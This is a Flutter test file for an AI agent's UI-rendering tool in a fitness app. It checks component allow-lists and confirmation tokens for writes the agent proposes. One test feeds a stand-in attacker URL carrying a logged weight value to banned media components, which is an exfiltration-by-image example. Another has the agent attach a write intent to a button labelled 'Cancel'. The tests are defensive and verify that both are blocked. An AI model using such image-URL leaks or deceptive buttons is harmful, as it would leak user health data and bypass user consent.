/*
 * This file is part of OmniHealth <https://github.com/wger-project>.
 * Copyright (c) 2026, OmniHealth contributors
 *
 * OmniHealth is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

import 'package:flutter_test/flutter_test.dart';
import 'package:wger/features/ai/genui/render_ui_tool.dart';
import 'package:wger/features/ai/tools/confirmation_token.dart';

void main() {
  late ConfirmationTokenService tokens;
  late List<SurfaceRequest> surfaced;
  late RenderUiTool tool;

  setUp(() {
    tokens = ConfirmationTokenService();
    surfaced = [];
    tool = RenderUiTool(
      tokenService: tokens,
      knownComponents: const {
        'Column', 'Row', 'Card', 'Text', 'Button', 'TextField', 'Slider',
        'MetricChart', 'ExerciseVideo', 'MetricEntryCard', 'ConfirmationCard',
      },
      writeComponents: const {'MetricEntryCard', 'ConfirmationCard'},
      surfaceSink: surfaced.add,
    );
  });

  group('catalog gating', () {
    test('is not a write tool — it only renders', () {
      expect(tool.isWrite, isFalse);
    });

    test('rejects a component outside the catalog', () async {
      final result = await tool.call({
        'component': 'ArbitraryHtml',
        'props': <String, dynamic>{},
      });
      expect(result.isError, isTrue);
      expect(result.message, contains('ArbitraryHtml'));
      expect(surfaced, isEmpty);
    });

    test('rejects the URL-taking Basic Catalog media components', () async {
      // Spec 5.5. Rendering one issues a GET to an agent-chosen host, with no
      // tap and no trace in the transcript.
      for (final banned in ['Image', 'Video', 'AudioPlayer']) {
        final result = await tool.call({
          'component': banned,
          'props': {'url': 'https://attacker.example/p.png?w=82.4'},
        });
        expect(result.isError, isTrue, reason: '$banned must not render');
        expect(surfaced, isEmpty, reason: '$banned must not reach a surface');
      }
    });

    test('accepts a Basic Catalog component', () async {
      final future = tool.call({'component': 'Card', 'props': <String, dynamic>{}});
      await Future<void>.delayed(Duration.zero);
      surfaced.single.dismiss();
      expect((await future).isError, isFalse);
    });
  });

  group('token minting — spec §5.2', () {
    test('a write component with an intent returns a token valid for that write', () async {
      final future = tool.call({
        'component': 'MetricEntryCard',
        'props': {'metric': 'weight', 'unit': 'kg'},
        'intent': {
          'tool': 'log_weight',
          'arguments': {'value': 82.4, 'date': '2026-08-07'},
        },
      });

      await Future<void>.delayed(Duration.zero);
      expect(surfaced, hasLength(1));
      surfaced.single.complete({'value': 82.4, 'date': '2026-08-07'});

      final result = await future;
      expect(result.isError, isFalse);

      final data = result.data! as Map<String, dynamic>;
      expect(data['action'], 'submit');
      expect(
        tokens.consume(
          token: data['confirmationToken'] as String,
          toolName: 'log_weight',
          arguments: {'value': 82.4, 'date': '2026-08-07'},
        ),
        TokenCheck.valid,
      );
    });

    test('a Basic Catalog component mints no token even when it declares an intent', () async {
      // The case spec 5.2 exists to prevent: a raw Button carrying a write
      // intent and labelled however the agent likes.
      final future = tool.call({
        'component': 'Button',
        'props': {'text': 'Cancel'},
        'intent': {
          'tool': 'log_weight',
          'arguments': {'value': 999.0},
        },
      });

      await Future<void>.delayed(Duration.zero);
      surfaced.single.complete({'tapped': true});

      final data = (await future).data! as Map<String, dynamic>;
      expect(data['action'], 'submit');
      expect(data.containsKey('confirmationToken'), isFalse);
    });

    test('a read component mints no token', () async {
      final future = tool.call({
        'component': 'MetricChart',
        'props': {'unit': 'kg', 'series': <dynamic>[]},
        'intent': {
          'tool': 'log_weight',
          'arguments': {'value': 1.0},
        },
      });

      await Future<void>.delayed(Duration.zero);
      surfaced.single.complete({});

      final data = (await future).data! as Map<String, dynamic>;
      expect(data.containsKey('confirmationToken'), isFalse);
    });

    test('dismissal returns no token at all', () async {
      final future = tool.call({
        'component': 'ConfirmationCard',
        'props': {'summary': 'Log 2 eggs?'},
        'intent': {
          'tool': 'log_nutrition_entry',
          'arguments': {'ingredientId': 1},
        },
      });

      await Future<void>.delayed(Duration.zero);
      surfaced.single.dismiss();

      final data = (await future).data! as Map<String, dynamic>;
      expect(data['action'], 'dismissed');
      expect(data.containsKey('confirmationToken'), isFalse);
    });

    test('a write component with no declared intent mints no token', () async {
      final future = tool.call({
        'component': 'MetricEntryCard',
        'props': {'metric': 'weight', 'unit': 'kg'},
      });

      await Future<void>.delayed(Duration.zero);
      surfaced.single.complete({'value': 82.4});

      final data = (await future).data! as Map<String, dynamic>;
      expect(data['action'], 'submit');
      expect(data.containsKey('confirmationToken'), isFalse);
    });

    test('the token covers the values the user submitted, not the declared template', () async {
      // The user edited the field before saving. The token must describe what
      // they actually saw and sent, or the honesty guarantee is hollow.
      final future = tool.call({
        'component': 'MetricEntryCard',
        'props': {'metric': 'weight', 'unit': 'kg'},
        'intent': {
          'tool': 'log_weight',
          'arguments': {'value': 80.0, 'date': '2026-08-07'},
        },
      });

      await Future<void>.delayed(Duration.zero);
      surfaced.single.complete({'value': 82.4, 'date': '2026-08-07'});

      final data = (await future).data! as Map<String, dynamic>;
      final token = data['confirmationToken'] as String;

      // Valid for the submitted 82.4...
      expect(
        tokens.consume(
          token: token,
          toolName: 'log_weight',
          arguments: {'value': 82.4, 'date': '2026-08-07'},
        ),
        TokenCheck.valid,
      );
    });

    test('the token is not valid for the agent’s original template values', () async {
      final future = tool.call({
        'component': 'MetricEntryCard',
        'props': {'metric': 'weight', 'unit': 'kg'},
        'intent': {
          'tool': 'log_weight',
          'arguments': {'value': 80.0, 'date': '2026-08-07'},
        },
      });

      await Future<void>.delayed(Duration.zero);
      surfaced.single.complete({'value': 82.4, 'date': '2026-08-07'});

      final token = ((await future).data! as Map<String, dynamic>)['confirmationToken'] as String;

      expect(
        tokens.consume(
          token: token,
          toolName: 'log_weight',
          arguments: {'value': 80.0, 'date': '2026-08-07'},
        ),
        TokenCheck.argumentMismatch,
      );
    });
  });

  group('surface lifecycle', () {
    test('the call suspends until the user acts', () async {
      var settled = false;
      final future = tool.call({
        'component': 'ConfirmationCard',
        'props': {'summary': 'ok?'},
      }).then((r) => settled = true);

      await Future<void>.delayed(Duration.zero);
      expect(settled, isFalse, reason: 'must not resolve before the user acts');

      surfaced.single.complete({});
      await future;
      expect(settled, isTrue);
    });

    test('the surface request carries the component and props through', () async {
      final future = tool.call({
        'component': 'MetricEntryCard',
        'props': {'metric': 'weight', 'unit': 'kg'},
      });

      await Future<void>.delayed(Duration.zero);
      expect(surfaced.single.component, 'MetricEntryCard');
      expect(surfaced.single.props['metric'], 'weight');

      surfaced.single.dismiss();
      await future;
    });

    test('acting twice does not throw', () async {
      // The UI could double-fire; a second completion must be ignored rather
      // than crashing the turn.
      final future = tool.call({'component': 'Card', 'props': <String, dynamic>{}});
      await Future<void>.delayed(Duration.zero);

      surfaced.single.complete({});
      surfaced.single.complete({});
      surfaced.single.dismiss();

      expect((await future).isError, isFalse);
    });
  });
}
